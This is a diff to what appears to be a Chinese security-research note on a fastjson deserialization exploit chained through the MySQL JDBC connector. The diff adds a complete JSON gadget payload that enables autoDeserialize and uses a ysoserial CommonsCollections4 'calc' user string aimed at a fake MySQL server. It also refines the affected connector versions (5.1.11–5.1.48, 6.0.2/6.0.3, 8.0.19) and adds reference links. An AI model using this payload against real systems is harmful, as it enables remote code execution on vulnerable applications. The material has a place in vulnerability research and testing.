@@ -45,9 +45,38 @@ payload：**{ \"name\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"c
 
 
 
+----
+
+```json
+{
+       "@type":"java.lang.AutoCloseable",
+       "@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
+       "proxy": {
+              "@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
+              "connectionUrl":{
+                     "@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl",
+                     "masters":[{
+                            "host":""
+                     }],
+                     "slaves":[],
+                     "properties":{
+                            "host":"127.0.0.1",
+                            "user":"yso_CommonsCollections4_calc",
+                            "dbname":"dbname",
+                            "password":"pass",
+                            "queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
+                            "autoDeserialize":"true"
+                     }
+              }
+       }
+}
+```
+
+
+
 ---
 
-以下是MySQL反序列化漏洞印象的版本，fastjson只能打5.x和6.x（实测）。
+以下是MySQL反序列化漏洞影响的版本，fastjson只能打5.1.11-5.1.48(反序列化链)、6.0.2/6.0.3(反序列化)、8.0.19(反序列化链)（实测）。
 
 ### 影响版本
 
@@ -69,7 +98,7 @@ payload：**{ \"name\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"c
 
 
 
-![image-20211220173824621](https://gitee.com/samny/images/raw/master/summersec//24u38er24ec/24u38er24ec.png)
+![image-20211220173824621](https://cdn.jsdelivr.net/gh/SummerSec/Images//52u3652ec52u3652ec.png)
 
 
 
@@ -80,3 +109,5 @@ payload：**{ \"name\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"c
 https://www.cnblogs.com/pickmea/p/15157189.html
 
 https://github.com/fnmsd/MySQL_Fake_Server
+
+https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg
